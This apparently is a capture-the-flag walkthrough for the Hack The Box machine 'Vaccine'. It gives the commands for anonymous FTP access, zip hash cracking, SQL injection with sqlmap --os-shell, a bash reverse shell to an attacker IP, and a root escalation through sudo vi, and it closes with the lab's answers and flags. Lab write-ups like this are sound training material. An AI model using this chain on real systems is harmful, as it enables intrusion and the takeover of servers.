# Vaccine - Very Easy

<details>
<summary>Nmap Scan</summary>

```shell
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.16
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: MegaCorp Login
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

</details>
<br>

```shell
nmap -T4 -p- -A 10.129.228.238

gobuster dir -u http://10.129.228.238/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -z
#this does not give any result

ftp 10.129.228.238
#login using anonymous mode

zip2john backup.zip > backuphash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt backuphash.txt

sqlmap --help

sqlmap -u 'http://10.129.228.238/dashboard.php?search=query' --cookie='PHPSESSID=vo3tv477lrn36gernqho5g1inh' --os-shell

#setup listener in another tab
nc -lvp 4444

#execute payload in os-shell
bash -c "bash -i >& /dev/tcp/10.10.15.16/4444 0>&1"

#we will receive shell in our listener
whoami

#upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash")'

find / -name user.txt 2>/dev/null
#to find user flag

cat /var/lib/postgresql/user.txt

cd /var/www/html

grep -rnw . -e 'password' 2>/dev/null
#look for pattern 'password'
#this gives us password for postgresql

sudo -l
#we can run vi as sudo

#we can connect via SSH using the creds found
ssh postgres@10.129.228.238

sudo vi -c ':!/bin/sh' /dev/null
#this exploit does not work
#so we read a file with enough privileges

sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
#this opens vi editor

#enter commands for interactive shell as root
:set shell=/bin/sh

:shell

#we get root access
cat /root/root.txt
```

```markdown
From nmap scan, we have three services to enumerate - SSH, HTTP and FTP

FTP allows anonymous mode, so we use that to get the backup.zip file.

Now this backup.zip file is password-protected, so we will have to use a service like zip2john, and then crack the hash using JtR.

JtR gives us the password '741852963', and with that we can extract the two files from the zip file.

The index.php file from the zip file contains the md5 hash '2cb42f8734ea607eefed3b70af13bbd3' for admin password.

When cracked this gives us the credentials admin:qwerty789, and it can be used for logging into the hosted website.

On logging in, we get some type of database details. The search function on the website uses the 'search' parameter; we can try sqlmap here.

Using sqlmap with the cookie value and the --os-shell option, to get an interactive shell, and we get it.

We can use a more stable shell by setting up a listener and spawning the shell there.

Once we get stable shell, we can get user flag.

For privesc, we also need current user's password; we can search for password in the machine itself.

Now, as we are postgres user, and machine uses PHP & SQL, we can try to look for cleartext creds in /var/www/html

And we do get password in dashboard.php, postgres:P@s5w0rd!

Using this creds, we can try for privesc by checking what commands we can run as sudo.

This shows us that we can run vi as sudo.

We can login through SSH for a more stable experience now that we have postgres creds.

Now that we can run /bin/vi as sudo, we need to access a file with read-write privileges.

Once we do that, we can run the exploit given on GTFObins for vi and we get root.
```

1. Besides SSH and HTTP, what other service is hosted on this box? - ftp

2. This service can be configured to allow login with any password for specific username. What is that username? - anonymous

3. What is the name of the file downloaded over this service? - backup.zip

4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts? - zip2john

5. What is the password for the admin user on the website? - qwerty789

6. What option can be passed to sqlmap to try to get command execution via the sql injection? - --os-shell

7. What program can the postgres user run as root using sudo? - vi

8. Submit user flag - ec9b13ca4d6229cd5cc1e09980965bf7

9. Submit root flag - dd6e058e814260bc70e9bbdef2715849
